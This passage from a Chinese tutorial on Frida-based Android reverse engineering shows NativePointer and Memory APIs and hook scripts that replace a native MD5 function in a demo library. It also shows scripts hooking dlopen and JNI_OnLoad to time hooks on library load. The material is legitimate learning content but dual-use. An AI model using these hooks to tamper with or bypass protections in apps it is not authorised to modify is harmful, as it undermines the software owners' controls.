class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">NativePointer</span> &#123;</span><br><span class="line">    <span class="comment">// NativePointer构造函数，通过new NativePointer(...) 或者ptr(...) 来使用</span></span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params">v: string | number | UInt64 | Int64 | NativePointerValue</span>);</span><br><span class="line">		<span class="comment">// 判断是否空指针</span></span><br><span class="line">		<span class="title function_">isNull</span>(): boolean;</span><br><span class="line">		<span class="comment">// 创建新指针，值等于this + v</span></span><br><span class="line">		<span class="title function_">add</span>(<span class="attr">v</span>: <span class="title class_">NativePointerValue</span> | <span class="title class_">UInt64</span> | <span class="title class_">Int64</span> | number | string): <span class="title class_">NativePointer</span>;</span><br><span class="line">		<span class="comment">// 创建新指针，值等于this - v</span></span><br><span class="line">    <span class="title function_">sub</span>(<span class="attr">v</span>: <span class="title class_">NativePointerValue</span> | <span class="title class_">UInt64</span> | <span class="title class_">Int64</span> | number | string): <span class="title class_">NativePointer</span>;</span><br><span class="line">		<span class="comment">// 更多用于指针计算的方法，请自行查阅相关文档和源码</span></span><br><span class="line">		......	</span><br><span class="line">		<span class="comment">// 比较两者是否相等</span></span><br><span class="line">		<span class="title function_">equals</span>(<span class="attr">v</span>: <span class="title class_">NativePointerValue</span> | <span class="title class_">UInt64</span> | <span class="title class_">Int64</span> | number | string): boolean;</span><br><span class="line">		<span class="comment">// 比较两者大小，返回1、-1、0</span></span><br><span class="line">		<span class="title function_">compare</span>(<span class="attr">v</span>: <span class="title class_">NativePointerValue</span> | <span class="title class_">UInt64</span> | <span class="title class_">Int64</span> | number | string): number;</span><br><span class="line">		<span class="comment">// 指针转32位有符号数</span></span><br><span class="line">		<span class="title function_">toInt32</span>(): number;</span><br><span class="line">		<span class="comment">// 指针转32位无符号数</span></span><br><span class="line">		<span class="title function_">toUInt32</span>(): number;</span><br><span class="line">		<span class="comment">// NativePointer类型转string类型，参数可以指定进制，默认16进制</span></span><br><span class="line">		<span class="title function_">toString</span>(radix?: number): string;</span><br><span class="line">    <span class="title function_">toJSON</span>(): string;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 读取4/8字节数据，转指针</span></span><br><span class="line">		<span class="title function_">readPointer</span>(): <span class="title class_">NativePointer</span>;</span><br><span class="line">		<span class="comment">// 读8bit数据，也就是1字节数据，转有符号数</span></span><br><span class="line">		<span class="title function_">readS8</span>(): number;</span><br><span class="line">		<span class="comment">// 读8bit数据，也就是1字节数据，转无符号数</span></span><br><span class="line">		<span class="title function_">readU8</span>(): number;</span><br><span class="line">		<span class="comment">// 更多读取数据转数值的方法依此类推</span></span><br><span class="line">		......	</span><br><span class="line">		<span class="comment">// 读指定字节数内存数据，返回ArrayBuffer </span></span><br><span class="line">		<span class="title function_">readByteArray</span>(<span class="attr">length</span>: number): <span class="title class_">ArrayBuffer</span> | <span class="literal">null</span>;</span><br><span class="line">		<span class="comment">// 读指定长度的C语言char*字符串，或者读取到遇字节0为止</span></span><br><span class="line">		<span class="title function_">readCString</span>(size?: number): string | <span class="literal">null</span>;</span><br><span class="line">		<span class="comment">// 读指定长度的Utf8字符串（可以是中文），或者读取到遇字节0为止</span></span><br><span class="line">		<span class="title function_">readUtf8String</span>(size?: number): string | <span class="literal">null</span>;</span><br><span class="line">		<span class="title function_">readUtf16String</span>(length?: number): string | <span class="literal">null</span>;</span><br><span class="line">		<span class="comment">// 仅限Windows平台使用</span></span><br><span class="line">    <span class="title function_">readAnsiString</span>(size?: number): string | <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 将4/8字节指针写入内存，后续基本都是与读取类似的操作，不再赘述</span></span><br><span class="line">		<span class="title function_">writePointer</span>(<span class="attr">value</span>: <span class="title class_">NativePointerValue</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line">    <span class="title function_">writeS8</span>(<span class="attr">value</span>: number | <span class="title class_">Int64</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line">    <span class="title function_">writeU8</span>(<span class="attr">value</span>: number | <span class="title class_">UInt64</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line">		......</span><br><span class="line">    <span class="title function_">writeByteArray</span>(<span class="attr">value</span>: <span class="title class_">ArrayBuffer</span> | number[]): <span class="title class_">NativePointer</span>;</span><br><span class="line">    <span class="title function_">writeUtf8String</span>(<span class="attr">value</span>: string): <span class="title class_">NativePointer</span>;</span><br><span class="line">		<span class="title function_">writeUtf16String</span>(<span class="attr">value</span>: string): <span class="title class_">NativePointer</span>;</span><br><span class="line">    <span class="title function_">writeAnsiString</span>(<span class="attr">value</span>: string): <span class="title class_">NativePointer</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Memory的常用方法"><a href="#Memory的常用方法" class="headerlink" title="Memory的常用方法"></a>Memory的常用方法</h3><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">declare namespace <span class="title class_">Memory</span> &#123;</span><br><span class="line"><span class="comment">// 异步，在内存中搜索指定数据</span></span><br><span class="line"><span class="comment">// 可以搜索指定指令，然后patch。可以搜索指定文件头，然后dump等等</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">scan</span>(<span class="params">address: NativePointerValue, size: number | UInt64, pattern: string, callbacks: MemoryScanCallbacks</span>): <span class="keyword">void</span>;</span><br><span class="line"><span class="comment">// scan的同步版本</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">scanSync</span>(<span class="params">address: NativePointerValue, size: number | UInt64, pattern: string</span>): <span class="title class_">MemoryScanMatch</span>[];</span><br><span class="line"><span class="comment">// 在frida私有堆上分配指定大小的内存，返回首地址</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">alloc</span>(<span class="params">size: number | UInt64, options?: MemoryAllocOptions</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line"><span class="comment">// 在frida私有堆上，将str作为UTF-8字符串进行分配、编码和写出</span></span><br><span class="line"><span class="comment">//（可以是中文）</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">allocUtf8String</span>(<span class="params">str: string</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">allocUtf16String</span>(<span class="params">str: string</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line"><span class="comment">// 仅限Windows平台使用</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">allocAnsiString</span>(<span class="params">str: string</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line"><span class="comment">// 内存拷贝，参数为目标地址、源地址、要复制的字节数</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">dst: NativePointerValue, src: NativePointerValue, n: number | UInt64</span>): <span class="keyword">void</span>;</span><br><span class="line"><span class="comment">// 先分配内存，然后进行拷贝</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">dup</span>(<span class="params">address: NativePointerValue, size: number | UInt64</span>): <span class="title class_">NativePointer</span>;</span><br><span class="line"><span class="comment">// 修改内存页权限，之前小节中有介绍，这里不再赘述</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">protect</span>(<span class="params">address: NativePointerValue, size: number | UInt64, protection: PageProtection</span>): boolean;</span><br><span class="line"><span class="comment">// 可以用来patch指令，本书后续内容中单独介绍</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">patchCode</span>(<span class="params">address: NativePointerValue, size: number | UInt64, apply: MemoryPatchApplyCallback</span>): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="替换函数"><a href="#替换函数" class="headerlink" title="替换函数"></a>替换函数</h3><p>介绍一个新的FridaAPi：Interceptor.replace方法</p>
<p>其源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare namespace <span class="title class_">Interceptor</span> &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">replace</span>(<span class="params">target: NativePointerValue, replacement: NativePointerValue,</span></span><br><span class="line"><span class="params">        data?: NativePointerValue</span>): <span class="keyword">void</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第0个参数需要传入NativePointer类型的目标地址，第一个参数掺入用于替换的函数（通常由new NativeCallback()构建），也得是NativePointer型的</p>
<p>NativeCallback源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">class</span> <span class="title class_">NativeCallback</span> <span class="keyword">extends</span> <span class="title class_ inherited__">NativePointer</span> &#123;</span><br><span class="line"><span class="title function_">constructor</span>(<span class="params">func: NativeCallbackImplementation, retType: NativeType, argTypes:</span></span><br><span class="line"><span class="params"> NativeType[], abi?: NativeABI</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>NativeCallback在实例化时，需要传入函数的实现，返回值类型，参数类型数组。该类继承了NativePointer，所以可传给replace函数的replacement参数。</p>
<p>简单案例如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> md5Func = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1F2C</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(md5Func, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;, <span class="string">&quot;void&quot;</span>, [ ]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_func</span>();</span><br><span class="line"><span class="comment">//logcat中的输出为</span></span><br><span class="line"><span class="comment">//CMD5 md5Result: null</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是，如果替换成空函数，NativeCallback的参数类型数组可以随便写或者为空数组。但是返回值类型最好和原函数返回值类型一致，而且要合理，别整太抽象。如果新韩淑影响了原函数的代码逻辑，APP是有可能崩溃的</p>
<p>稍作修改如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> md5Func = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1F2C</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(md5Func, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">100</span>;</span><br><span class="line">    &#125;, <span class="string">&quot;int&quot;</span>, []));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_func</span>();</span><br><span class="line">**<span class="comment">//该函数触发后，app崩溃**</span></span><br></pre></td></tr></table></figure>

<p>替换时打印原函数实参（需要将参数类型写对）</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> md5Func = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1F2C</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(md5Func, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">env, jclass, data</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(env);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(jclass);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="title function_">getStringUtfChars</span>(data).<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>().<span class="title function_">newStringUtf</span>(<span class="string">&quot;this is return value&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;int&quot;</span>, <span class="string">&quot;pointer&quot;</span>]));<span class="comment">//这一句是有错的，jcalss的类型是指针，但这里声明的是int,会导致取出的结果错误</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_func</span>();</span><br><span class="line"><span class="comment">//0x7627ad5610</span></span><br><span class="line"><span class="comment">//-22369900</span></span><br><span class="line"><span class="comment">//xiaojianbang</span></span><br></pre></td></tr></table></figure>

<p>这个才是正确的</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> md5Addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1F2C</span>);</span><br><span class="line">    <span class="keyword">var</span> md5Func = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(md5Addr, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(md5Addr, <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params">env, jclass, data</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> fridaEnv = <span class="title class_">Java</span>.<span class="property">vm</span>.<span class="title function_">tryGetEnv</span>();</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(env, jclass, fridaEnv.<span class="title function_">getStringUtfChars</span>(data).<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="keyword">var</span> retval = <span class="title function_">md5Func</span>(env, jclass, data);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(fridaEnv.<span class="title function_">getStringUtfChars</span>(retval).<span class="title function_">readCString</span>());</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;, <span class="string">&quot;pointer&quot;</span>, [<span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>, <span class="string">&quot;pointer&quot;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_func</span>();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0x7a4fb206c0 0x7fe6e9a5a4 xiaojianbang</span></span><br><span class="line"><span class="comment">41bef1ce7fdc3e42c0e5d940ad74ac00</span></span><br><span class="line"><span class="comment">//logcat中的输出为</span></span><br><span class="line"><span class="comment">CMD5 md5Result: 41bef1ce7fdc3e42c0e5d940ad74ac00</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="Frida的一些进阶Hook"><a href="#Frida的一些进阶Hook" class="headerlink" title="Frida的一些进阶Hook"></a>Frida的一些进阶Hook</h3><h3 id="Hook系统函数dlopen"><a href="#Hook系统函数dlopen" class="headerlink" title="Hook系统函数dlopen"></a>Hook系统函数dlopen</h3><p><a target="_blank" rel="noopener" href="https://www.notion.so/dlopen-f062d9e1f5434d03b72b8d9227fc3f89">dlopen()</a></p>
<p>Hook so层，时机很重要，比如想要在so函数加载完成后，而so中的某个函数还没有被调用之前（或者在JNI_Onload被调用之前-因为有可能该函数被放在JNI_Onload的第一行）对该函数进行Hook。这时候，dlopen就派上用场了。<strong>系统加载的so文件和自己加载的so文件，一般都要通过这个函数（最好以spawn方式注入）</strong></p>
<p>dlopen的第0个参数是被加载的so文件路径，第一个参数用于指定加载模式。Hook代码如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> myInit = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1DE8</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(myInit,  <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;replace myInit success&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&quot;void&quot;</span>,  [ ]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(android_dlopen_ext, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> soPath = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span>(soPath.<span class="title function_">indexOf</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>) != -<span class="number">1</span>) <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params">retval</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>)  <span class="title function_">hook_func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_dlopen</span>();</span><br><span class="line"><span class="comment">// replace myInit success</span></span><br></pre></td></tr></table></figure>

<p>android_dlopen_ext用于加载so文件，__filename 和 __flags 参数与 dlopen(3) 相同，通过 __info 的 flags 成员提供特定于 Android 的flag。</p>
<p>源码声明如下</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> * <span class="title function_">android_dlopen_ext</span>(</span><br><span class="line">  <span class="keyword">const</span> char *__filename,</span><br><span class="line">  int __flags,</span><br><span class="line">  <span class="keyword">const</span> android_dlextinfo *__info</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">//The __filename and __flags arguments are the same as for dlopen(3), with the Android-specific flags supplied via the flags member of __info.Available since API level 21.</span></span><br></pre></td></tr></table></figure>

<p>低android版本中，dlopen用于加载so文件，这里改一下啊，两个都Hook</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_func</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> myInit = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>).<span class="title function_">add</span>(<span class="number">0x1DE8</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">replace</span>(myInit,  <span class="keyword">new</span> <span class="title class_">NativeCallback</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;replace myInit success&quot;</span>);</span><br><span class="line">    &#125;, <span class="string">&quot;void&quot;</span>,  [ ]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">addr, soName, callback</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> name = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(soName) != -<span class="number">1</span>) <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) <span class="title function_">callback</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(dlopen, <span class="string">&quot;libxiaojianbang.so&quot;</span>, hook_func);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(android_dlopen_ext, <span class="string">&quot;libxiaojianbang.so&quot;</span>, hook_func);</span><br><span class="line"><span class="comment">// replace myInit success</span></span><br></pre></td></tr></table></figure>

<h3 id="Hook-JNI-Onload"><a href="#Hook-JNI-Onload" class="headerlink" title="Hook JNI_Onload"></a>Hook JNI_Onload</h3><p>在so文件被加载后，系统会自动调用JNI_Onload，但也是在dlopen(或android_dlopen_ext)之后。所以Hook方法与普通函数一致，直接Hook dlopen即可</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_JNIOnload</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> JNI_OnLoad = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;JNI_OnLoad&quot;</span>);</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(JNI_OnLoad, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">0</span>]);</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(retval);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hook_dlopen</span>(<span class="params">addr, soName, callback</span>) &#123;</span><br><span class="line">    <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">        <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">            <span class="keyword">var</span> name = args[<span class="number">0</span>].<span class="title function_">readCString</span>();</span><br><span class="line">            <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(soName) != -<span class="number">1</span>) <span class="variable language_">this</span>.<span class="property">hook</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;, <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">hook</span>) <span class="title function_">callback</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> dlopen = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;dlopen&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> android_dlopen_ext = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libdl.so&quot;</span>, <span class="string">&quot;android_dlopen_ext&quot;</span>);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(dlopen, <span class="string">&quot;libxiaojianbang.so&quot;</span>, hook_JNIOnload);</span><br><span class="line"><span class="title function_">hook_dlopen</span>(android_dlopen_ext, <span class="string">&quot;libxiaojianbang.so&quot;</span>, hook_JNIOnload);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0x7a4faaf1c0</span></span><br><span class="line"><span class="comment">0x10006		// JNIOnload函数必须返回一个合理的jni版本号，这里返回的是1.6</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<h3 id="Hook-initarray"><a href="#Hook-initarray" class="headerlink" title="Hook initarray"></a>Hook initarray</h3><p>在so文件加载过程中，系统会自动调用so文件中的init,init_array,和JNI_Onload函数。前两个实在dlopen函数执行过程中调用的。JNI_Onload是在dlopen函数执行之后调用的。</p>
<p>此时就有一个问题。如果将Hook initarray的代码放在dlopen的onEnter里面，so文件还没有加载，自然无法Hook initarray，onLeave就不用想了。故，需要在dlopen函数内部找一个时机。so已经加载，但init，init_array未被调用。linker (<strong>这玩意儿有32位和64位的区别</strong>) 的call_constructors满足这些需求。该函数用于调用so文件的init和init_array函数。且all_constructors在linker的符号表中，不需要额外计算偏移地址。但还是要Hook dlopen来监控so文件的加载</p>
